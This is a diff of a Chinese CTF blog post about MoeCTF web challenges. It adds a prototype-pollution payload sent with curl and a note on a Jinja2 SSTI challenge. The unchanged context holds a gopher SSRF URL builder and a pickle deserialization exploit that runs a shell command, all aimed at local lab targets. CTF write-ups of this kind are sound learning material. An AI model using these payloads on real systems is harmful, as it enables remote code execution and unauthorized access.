@@ -27,7 +27,7 @@
 <meta property="og:description" content="随着解题进度更新……没打完的题目标注了thinking,只能抽时间打了（ WebWeb 安全与渗透测试入门指北下载附件打开html,F12搜索moe关键字即得 查分系统下载html，F12查看前端页面，打开script标签发现学号信息，搜索moectf关键字即得。 归途连接靶机，F12可得。key2:QDBtNG9k同时可以看到一段混淆过后的script代码 1234567891011121314">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-09-16T15:34:59.000Z">
-<meta property="article:modified_time" content="2026-09-16T15:41:57.780Z">
+<meta property="article:modified_time" content="2026-10-16T15:06:58.438Z">
 <meta property="article:author" content="blank">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
@@ -347,7 +347,7 @@ mjx-container[display="true"] + br {
         
         
         
-          123 mins
+          127 mins
         
       </span>
     
@@ -458,7 +458,7 @@ mjx-container[display="true"] + br {
 <p>（让ai梭了一个gopher编码的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote_from_bytes<br><span class="hljs-comment"># ===== 数据区 =====</span><br>TARGET_HOST = <span class="hljs-string">"127.0.0.1"</span><br>TARGET_PORT = <span class="hljs-number">54321</span><br>RAW_PACKET = (<br>	<span class="hljs-string">b"GET / HTTP/1.0\r\n"</span><br>	<span class="hljs-string">b"\r\n"</span><br>)<br><span class="hljs-comment"># ========================</span><br>gopher_url = (<br>	<span class="hljs-string">f"gopher://<span class="hljs-subst">{TARGET_HOST}</span>:<span class="hljs-subst">{TARGET_PORT}</span>/_"</span><br>	+ quote_from_bytes(RAW_PACKET, safe=<span class="hljs-string">""</span>)<br>)<br><br><span class="hljs-built_in">print</span>(gopher_url)<br></code></pre></td></tr></table></figure>
 <p>先发送最简的数据包发现给出了路径为/secret-honey<br>在脚本中添加路径重新构造payload发送可以获得flag</p>
-<h2 id="我爱发明-thinking"><a href="#我爱发明-thinking" class="headerlink" title="我爱发明[thinking]"></a>我爱发明[thinking]</h2><p>用yakit可以爆出所有数据，而且很快（（（不过要拼手速抢一下token</p>
+<h2 id="我爱发明-thinking"><a href="#我爱发明-thinking" class="headerlink" title="我爱发明[thinking]"></a>我爱发明[thinking]</h2><p>怪怪的，拼了俩sha256也没对…..思考</p>
 <h2 id="日志系统"><a href="#日志系统" class="headerlink" title="日志系统"></a>日志系统</h2><p>题目没啥信息。<br>下载附件并分析，这是一个python pickle反序列化，挠头。<br>官方文档<code>https://docs.python.org/3/library/pickle.html</code>,接下来构造利用反序列化的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>OUTPUT = Path(<span class="hljs-string">"/tmp/subdiary-exp.pkl"</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>		command = [<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"env | sort"</span>]<br>		<span class="hljs-keyword">return</span> (<span class="hljs-built_in">__import__</span>(<span class="hljs-string">"subprocess"</span>).check_output, (command,))<br><br>OUTPUT.write_bytes(pickle.dumps(Exploit(), protocol=<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] payload generated: <span class="hljs-subst">{OUTPUT}</span>"</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] size: <span class="hljs-subst">{OUTPUT.stat().st_size}</span> bytes"</span>)<br></code></pre></td></tr></table></figure>
 
@@ -472,7 +472,13 @@ mjx-container[display="true"] + br {
 <p>生成payload文件后发送实现反序列化</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -sS -i --max-time <span class="hljs-number">15</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>-F 'file=@/tmp/subdiary-exp.pkl;filename=logs.pkl' <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>http://<span class="hljs-number">127.0.0.1:43609</span>/import<br></code></pre></td></tr></table></figure>
 <p>执行可获得flag</p>
-<h2 id="礼崩乐坏-thinking"><a href="#礼崩乐坏-thinking" class="headerlink" title="礼崩乐坏[thinking]"></a>礼崩乐坏[thinking]</h2><h1 id="开发与运维基础"><a href="#开发与运维基础" class="headerlink" title="开发与运维基础"></a>开发与运维基础</h1><p>没打过，打着看看？</p>
+<h2 id="礼崩乐坏"><a href="#礼崩乐坏" class="headerlink" title="礼崩乐坏"></a>礼崩乐坏</h2><p>同合乎周礼，js原型链污染，先尝试上一题的payload。<br>返回”message”: “配置值仅允许布尔值、数字、短字符串或 null”<br>最终payload</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust">curl -sS -i -X POST <span class="hljs-symbol">'http</span>:<span class="hljs-comment">//127.0.0.1:46127/api/profile' \</span><br>  -H <span class="hljs-symbol">'Content</span>-Type: application/json<span class="hljs-string">' \</span><br><span class="hljs-string">  --data-raw '</span>{<span class="hljs-string">"constructor.prototype.canReadFlag"</span>:<span class="hljs-literal">true</span>}<span class="hljs-string">'//同时要把isAdmin带进去</span><br></code></pre></td></tr></table></figure>
+<p>用constructor.prototype代替了原本的proto，绕过了配置值的限制</p>
+<p><code>config</code> 自己并没有 <code>constructor</code> 属性。但 JavaScript 里，普通对象都从 <code>Object.prototype</code> 继承了一个 <code>constructor</code> 属性。<br>这个 <code>constructor</code> 指向 <code>Object</code> 构造函数</p>
+<h2 id="bblogin-thinking"><a href="#bblogin-thinking" class="headerlink" title="bblogin[thinking]"></a>bblogin[thinking]</h2><p>给后端了，那直接喂给AI分析漏洞吧(bushi</p>
+<p>开玩笑的，我们进行一些代码审计可以定位到/login界面，可以分析出这是个jinja2的ssti（给后端了啊喂</p>
+<h1 id="开发与运维基础"><a href="#开发与运维基础" class="headerlink" title="开发与运维基础"></a>开发与运维基础</h1><p>没打过，打着看看？</p>
 <h2 id="当-Nginx-不在家"><a href="#当-Nginx-不在家" class="headerlink" title="当 Nginx 不在家"></a>当 Nginx 不在家</h2><p>根据题目描述连接靶机，注意到3000端口，简单nc一下<br>多nc几次就会发现这个端口一直在被post /flag,读取ch的字段并完整拼接<br><code>moectf{WEB-s3rver-PRov1dE-r3li4BI3-5erVlCe-f0r-tHE-WOR1d0}</code></p>
 <h2 id="网站日志取证大师"><a href="#网站日志取证大师" class="headerlink" title="网站日志取证大师"></a>网站日志取证大师</h2><p>谢邀，做不来取证…….眼睛要瞎了。<br>codex分析的不要打我口牙（<br><code>moectf{11-curl/8.7.1-2214-CVE-2017-9841-235216-000808}</code></p>
 <h1 id="总结-unfinished"><a href="#总结-unfinished" class="headerlink" title="总结(unfinished)"></a>总结(unfinished)</h1><p>比去年举步维艰的情况来说，今年打moe确实轻松了不少，感觉自己取得了一些进步！包括对自己擅长的部分敏锐度提高了很多，简单的题能顺利地梳理出思路。</p>
@@ -566,6 +572,12 @@ mjx-container[display="true"] + br {
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2026/10/16/Yakit%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/" title="Yakit配置指南">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Yakit配置指南</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
